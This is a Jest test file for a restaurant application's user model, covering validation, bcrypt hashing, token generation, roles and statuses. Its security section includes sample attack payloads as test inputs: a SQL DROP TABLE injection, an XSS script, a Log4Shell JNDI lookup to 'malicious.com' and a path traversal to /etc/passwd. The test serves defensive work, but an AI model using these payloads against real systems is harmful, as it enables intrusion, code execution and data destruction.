const userModel = require('../../src/models/userModel');
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');

// Mock dependencies
jest.mock('../../src/utils/logger', () => ({
  logger: {
    child: jest.fn(() => ({
      info: jest.fn(),
      error: jest.fn(),
      warn: jest.fn(),
      debug: jest.fn(),
    })),
  },
}));

jest.mock('../../src/config/db');

describe('UserModel Comprehensive Test Suite', () => {
  let testUser;
  let testRestaurantId;

  beforeAll(() => {
    // Set up test environment
    process.env.NODE_ENV = 'test';
    process.env.DB_NAME = 'alacarte_test';
  });

  beforeEach(() => {
    // Reset all mocks
    jest.clearAllMocks();

    // Generate test data
    testRestaurantId = uuidv4();
    testUser = {
      id: uuidv4(),
      email: 'test@example.com',
      username: 'testuser',
      password: 'password123',
      full_name: 'Test User',
      role: 'waiter',
      restaurant_id: testRestaurantId,
      status: 'active',
      email_confirmed: false,
      first_login_password_change: true,
      created_at: new Date(),
      updated_at: new Date(),
    };
  });

  // =====================================
  // 1. UNIT TESTS (ISOLATED LOGIC TESTING)
  // =====================================

  describe('Unit Tests - Isolated Logic', () => {
    // Schema Validation Tests
    describe('Schema Validation', () => {
      test('should validate UUID format correctly', () => {
        const validUuid = uuidv4();
        const invalidUuid = 'invalid-uuid';

        expect(userModel.isValidUuid(validUuid)).toBe(true);
        expect(userModel.isValidUuid(invalidUuid)).toBe(false);
        expect(userModel.isValidUuid(null)).toBe(false);
        expect(userModel.isValidUuid('')).toBe(false);
      });

      test('should have proper validation schemas', () => {
        expect(userModel.createSchema).toBeDefined();
        expect(userModel.updateSchema).toBeDefined();
        expect(userModel.uuidSchema).toBeDefined();
        expect(typeof userModel.createSchema.validate).toBe('function');
        expect(typeof userModel.updateSchema.validate).toBe('function');
      });

      test('should validate password requirements', () => {
        const shortPassword = '123';
        const validPassword = 'validPassword123';

        expect(validPassword.length).toBeGreaterThanOrEqual(8);
        expect(shortPassword.length).toBeLessThan(8);
      });

      test('should validate email format', () => {
        const validEmail = 'test@example.com';
        const invalidEmail = 'invalid-email';

        expect(validEmail.includes('@')).toBe(true);
        expect(invalidEmail.includes('@')).toBe(false);
      });

      test('should validate role restrictions', () => {
        const validRoles = [
          'restaurant_administrator',
          'location_administrator',
          'waiter',
          'food_runner',
          'kds_operator',
          'pos_operator',
        ];

        expect(validRoles.includes('waiter')).toBe(true);
        expect(validRoles.includes('invalid_role')).toBe(false);
      });
    });

    // Business Logic Tests
    describe('Business Logic', () => {
      test('should hash password correctly', async () => {
        const password = 'testpassword123';
        const hashedPassword = await userModel.hashPassword(password);

        expect(hashedPassword).toBeDefined();
        expect(hashedPassword).not.toBe(password);
        expect(typeof hashedPassword).toBe('string');
        expect(hashedPassword.length).toBeGreaterThan(50);
      });

      test('should verify password correctly', async () => {
        const password = 'testpassword123';
        const hashedPassword = await bcrypt.hash(password, 12);

        const isValid = await userModel.verifyPassword(password, hashedPassword);
        const isInvalid = await userModel.verifyPassword('wrongpassword', hashedPassword);

        expect(isValid).toBe(true);
        expect(isInvalid).toBe(false);
      });

      test('should generate secure tokens', () => {
        const emailToken = userModel.generateEmailConfirmationToken();
        const resetToken = userModel.generatePasswordResetToken();

        expect(emailToken).toBeDefined();
        expect(resetToken).toBeDefined();
        expect(typeof emailToken).toBe('string');
        expect(typeof resetToken).toBe('string');
        expect(emailToken.length).toBe(64); // 32 bytes in hex = 64 characters
        expect(resetToken.length).toBe(64);
        expect(emailToken).not.toBe(resetToken);
      });

      test('should generate unique tokens on multiple calls', () => {
        const tokens = [];
        for (let i = 0; i < 10; i++) {
          tokens.push(userModel.generateEmailConfirmationToken());
        }

        const uniqueTokens = new Set(tokens);
        expect(uniqueTokens.size).toBe(tokens.length);
      });
    });

    // Data Transformation Tests
    describe('Data Transformation', () => {
      test('should handle case-insensitive operations', () => {
        const upperEmail = 'TEST@EXAMPLE.COM';
        const lowerEmail = upperEmail.toLowerCase();

        expect(lowerEmail).toBe('test@example.com');
      });

      test('should validate UUID transformation', () => {
        const validUuid = uuidv4();
        const result = userModel.validateUuid(validUuid);

        expect(result).toBeDefined();
        expect(result.isValid).toBe(true);
      });
    });
  });

  // =====================================
  // 2. INTEGRATION TESTS (MOCK-BASED)
  // =====================================

  describe('Integration Tests - Mock Database Operations', () => {
    describe('User Creation', () => {
      test('should validate user data before creation', () => {
        const userData = {
          email: 'test@example.com',
          password: 'password123',
          full_name: 'Test User',
          role: 'waiter',
        };

        // Test that validation schemas exist and can be used
        const createSchema = userModel.createSchema;
        expect(createSchema).toBeDefined();

        const { error } = createSchema.validate(userData);
        expect(error).toBeUndefined();
      });

      test('should reject invalid user data', () => {
        const invalidUserData = {
          email: 'invalid-email',
          password: '123', // Too short
          full_name: '', // Empty
          role: 'invalid_role',
        };

        const createSchema = userModel.createSchema;
        const { error } = createSchema.validate(invalidUserData);
        expect(error).toBeDefined();
      });
    });

    describe('User Updates', () => {
      test('should validate update data', () => {
        const updateData = {
          full_name: 'Updated Name',
          status: 'active',
        };

        const updateSchema = userModel.updateSchema;
        const { error } = updateSchema.validate(updateData);
        expect(error).toBeUndefined();
      });

      test('should reject empty update data', () => {
        const updateSchema = userModel.updateSchema;
        const { error } = updateSchema.validate({});
        expect(error).toBeDefined();
      });
    });
  });

  // =====================================
  // 3. DATA VALIDATION AND CONSTRAINTS
  // =====================================

  describe('Data Validation and Constraints', () => {
    describe('Field Validation', () => {
      test('should enforce password strength requirements', () => {
        const weakPassword = '123';
        const strongPassword = 'strongPassword123!';

        expect(strongPassword.length).toBeGreaterThanOrEqual(8);
        expect(weakPassword.length).toBeLessThan(8);
      });

      test('should validate email format constraints', () => {
        const validEmails = [
          'test@example.com',
          'user.name@domain.co.uk',
          'admin@restaurant-app.com',
        ];

        const invalidEmails = ['invalid-email', '@domain.com', 'user@'];

        validEmails.forEach((email) => {
          expect(email.includes('@')).toBe(true);
          expect(email.split('@')).toHaveLength(2);
        });

        invalidEmails.forEach((email) => {
          const parts = email.split('@');
          const isInvalid = parts.length !== 2 || parts[0] === '' || parts[1] === '';
          expect(isInvalid).toBe(true);
        });
      });

      test('should validate username constraints', () => {
        const validUsernames = ['user123', 'testuser', 'admin2024'];
        const invalidUsernames = ['us', 'user with spaces', 'user@name', ''];

        validUsernames.forEach((username) => {
          expect(username.length).toBeGreaterThanOrEqual(3);
          expect(/^[a-zA-Z0-9]+$/.test(username)).toBe(true);
        });

        invalidUsernames.forEach((username) => {
          expect(username.length < 3 || !/^[a-zA-Z0-9]+$/.test(username)).toBe(true);
        });
      });
    });

    describe('Role-based Validation', () => {
      test('should enforce role-specific requirements', () => {
        const adminData = {
          email: 'admin@restaurant.com',
          role: 'restaurant_administrator',
          restaurant_id: uuidv4(),
        };

        const waiterData = {
          username: 'waiter123',
          role: 'waiter',
        };

        // Admin roles require email and restaurant_id
        expect(adminData.email).toBeDefined();
        expect(adminData.restaurant_id).toBeDefined();

        // Waiters can use username instead of email
        expect(waiterData.username).toBeDefined();
      });
    });
  });

  // =====================================
  // 4. ERROR HANDLING AND EDGE CASES
  // =====================================

  describe('Error Handling and Edge Cases', () => {
    test('should handle invalid UUID formats', () => {
      const invalidUuids = [
        'invalid-uuid',
        '123-456-789',
        '',
        null,
        undefined,
        'not-a-uuid-at-all',
      ];

      invalidUuids.forEach((uuid) => {
        expect(userModel.isValidUuid(uuid)).toBe(false);
      });
    });

    test('should handle null and undefined values', () => {
      expect(userModel.isValidUuid(null)).toBe(false);
      expect(userModel.isValidUuid(undefined)).toBe(false);
    });

    test('should handle empty strings and whitespace', () => {
      expect(userModel.isValidUuid('')).toBe(false);
      expect(userModel.isValidUuid('   ')).toBe(false);
    });

    test('should validate UUID schema validation', () => {
      const validUuid = uuidv4();
      const invalidUuid = 'invalid';

      const uuidSchema = userModel.uuidSchema;

      const validResult = uuidSchema.validate(validUuid);
      const invalidResult = uuidSchema.validate(invalidUuid);

      expect(validResult.error).toBeUndefined();
      expect(invalidResult.error).toBeDefined();
    });
  });

  // =====================================
  // 5. PERFORMANCE TESTS
  // =====================================

  describe('Performance Tests', () => {
    test('should hash passwords efficiently', async () => {
      const password = 'testpassword123';
      const iterations = 5;
      const startTime = Date.now();

      for (let i = 0; i < iterations; i++) {
        await userModel.hashPassword(password);
      }

      const endTime = Date.now();
      const avgTime = (endTime - startTime) / iterations;

      expect(avgTime).toBeLessThan(2000); // Should average less than 2 seconds per hash
    });

    test('should verify passwords efficiently', async () => {
      const password = 'testpassword123';
      const hashedPassword = await bcrypt.hash(password, 12);
      const iterations = 10;
      const startTime = Date.now();

      for (let i = 0; i < iterations; i++) {
        await userModel.verifyPassword(password, hashedPassword);
      }

      const endTime = Date.now();
      const avgTime = (endTime - startTime) / iterations;

      expect(avgTime).toBeLessThan(1000); // Should average less than 1 second per verification
    });

    test('should generate tokens quickly', () => {
      const iterations = 1000;
      const startTime = Date.now();

      for (let i = 0; i < iterations; i++) {
        userModel.generateEmailConfirmationToken();
      }

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      expect(totalTime).toBeLessThan(500); // Should generate 1000 tokens in less than 500ms
    });
  });

  // =====================================
  // 6. SECURITY TESTS
  // =====================================

  describe('Security Tests', () => {
    test('should use secure password hashing', async () => {
      const password = 'testpassword123';
      const hashedPassword = await userModel.hashPassword(password);

      // Should use bcrypt with cost factor 12
      expect(hashedPassword).toMatch(/^\$2[ab]\$12\$/);
      expect(hashedPassword.length).toBeGreaterThan(50);
      expect(hashedPassword).not.toContain(password);
    });

    test('should generate cryptographically secure tokens', () => {
      const token1 = userModel.generateEmailConfirmationToken();
      const token2 = userModel.generatePasswordResetToken();

      // Should be 64-character hex strings (32 bytes)
      expect(token1).toMatch(/^[a-f0-9]{64}$/);
      expect(token2).toMatch(/^[a-f0-9]{64}$/);
      expect(token1).not.toBe(token2);
    });

    test('should handle sensitive field sanitization', () => {
      // Test that sensitive fields are defined
      expect(userModel.sensitiveFields).toContain('password');
      expect(userModel.sensitiveFields).toContain('email_confirmation_token');
      expect(userModel.sensitiveFields).toContain('password_reset_token');
    });

    test('should validate against common security threats', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://malicious.com/a}',
        '../../../etc/passwd',
      ];

      // These inputs should not cause the system to crash
      maliciousInputs.forEach((input) => {
        expect(() => userModel.isValidUuid(input)).not.toThrow();

        const schema = userModel.createSchema;
        const result = schema.validate({ email: input });
        // Should either pass validation (and be sanitized) or fail validation
        expect(result).toBeDefined();
      });
    });
  });

  // =====================================
  // 7. STATE AND LIFECYCLE TESTS
  // =====================================

  describe('State and Lifecycle Tests', () => {
    test('should handle user status management', () => {
      const validStatuses = ['pending', 'active', 'inactive', 'suspended'];
      const invalidStatuses = ['deleted', 'banned', 'unknown'];

      validStatuses.forEach((status) => {
        const updateSchema = userModel.updateSchema;
        const result = updateSchema.validate({ status });
        expect(result.error).toBeUndefined();
      });

      invalidStatuses.forEach((status) => {
        const updateSchema = userModel.updateSchema;
        const result = updateSchema.validate({ status });
        expect(result.error).toBeDefined();
      });
    });

    test('should handle role transitions', () => {
      const validRoles = [
        'restaurant_administrator',
        'location_administrator',
        'waiter',
        'food_runner',
        'kds_operator',
        'pos_operator',
      ];

      validRoles.forEach((role) => {
        const updateSchema = userModel.updateSchema;
        const result = updateSchema.validate({ role });
        expect(result.error).toBeUndefined();
      });
    });

    test('should manage email confirmation state', () => {
      const updateSchema = userModel.updateSchema;

      const confirmResult = updateSchema.validate({ email_confirmed: true });
      const unconfirmResult = updateSchema.validate({ email_confirmed: false });

      expect(confirmResult.error).toBeUndefined();
      expect(unconfirmResult.error).toBeUndefined();
    });

    test('should track password change requirements', () => {
      const updateSchema = userModel.updateSchema;

      const requiredResult = updateSchema.validate({ first_login_password_change: true });
      const notRequiredResult = updateSchema.validate({ first_login_password_change: false });

      expect(requiredResult.error).toBeUndefined();
      expect(notRequiredResult.error).toBeUndefined();
    });
  });

  // =====================================
  // 8. TRANSACTION AND CONSISTENCY TESTS
  // =====================================

  describe('Transaction and Consistency Tests', () => {
    test('should maintain data consistency rules', () => {
      // Test that restaurant_administrator requires restaurant_id
      const adminSchema = userModel.createSchema;

      const validAdmin = {
        email: 'admin@restaurant.com',
        password: 'password123',
        full_name: 'Restaurant Admin',
        role: 'restaurant_administrator',
        restaurant_id: uuidv4(),
      };

      const invalidAdmin = {
        email: 'admin@restaurant.com',
        password: 'password123',
        full_name: 'Restaurant Admin',
        role: 'restaurant_administrator',
        // Missing restaurant_id
      };

      const validResult = adminSchema.validate(validAdmin);
      const invalidResult = adminSchema.validate(invalidAdmin);

      expect(validResult.error).toBeUndefined();
      expect(invalidResult.error).toBeDefined();
    });

    test('should enforce username or email requirement', () => {
      const createSchema = userModel.createSchema;

      const withEmail = {
        email: 'test@example.com',
        password: 'password123',
        full_name: 'Test User',
        role: 'waiter',
      };

      const withUsername = {
        username: 'testuser',
        password: 'password123',
        full_name: 'Test User',
        role: 'waiter',
      };

      const withNeither = {
        password: 'password123',
        full_name: 'Test User',
        role: 'waiter',
      };

      expect(createSchema.validate(withEmail).error).toBeUndefined();
      expect(createSchema.validate(withUsername).error).toBeUndefined();
      expect(createSchema.validate(withNeither).error).toBeDefined();
    });

    test('should handle concurrent validation scenarios', () => {
      // Test multiple simultaneous validations
      const promises = [];
      for (let i = 0; i < 10; i++) {
        const userData = {
          email: `test${i}@example.com`,
          username: `user${i}`,
          password: 'password123',
          full_name: `Test User ${i}`,
          role: 'waiter',
        };

        promises.push(Promise.resolve(userModel.createSchema.validate(userData)));
      }

      return Promise.all(promises).then((results) => {
        results.forEach((result) => {
          expect(result.error).toBeUndefined();
        });
      });
    });
  });

  // =====================================
  // MODEL STRUCTURE AND API TESTS
  // =====================================

  describe('Model Structure and API', () => {
    test('should have all required properties', () => {
      expect(userModel.tableName).toBe('users');
      expect(userModel.sensitiveFields).toBeInstanceOf(Array);
      expect(userModel.sensitiveFields.length).toBeGreaterThan(0);
    });

    test('should have all required methods', () => {
      const requiredMethods = [
        'validateUuid',
        'isValidUuid',
        'hashPassword',
        'verifyPassword',
        'generateEmailConfirmationToken',
        'generatePasswordResetToken',
        'create',
        'findById',
        'findByEmail',
        'findByUsername',
        'authenticate',
        'update',
        'deleteUser',
        'confirmEmail',
        'changePassword',
        'checkRestaurantExists',
        'getUsersByRestaurant',
      ];

      requiredMethods.forEach((method) => {
        expect(typeof userModel[method]).toBe('function');
      });
    });

    test('should have proper schema getters', () => {
      expect(userModel.uuidSchema).toBeDefined();
      expect(userModel.createSchema).toBeDefined();
      expect(userModel.updateSchema).toBeDefined();
      expect(typeof userModel.uuidSchema.validate).toBe('function');
      expect(typeof userModel.createSchema.validate).toBe('function');
      expect(typeof userModel.updateSchema.validate).toBe('function');
    });
  });
});
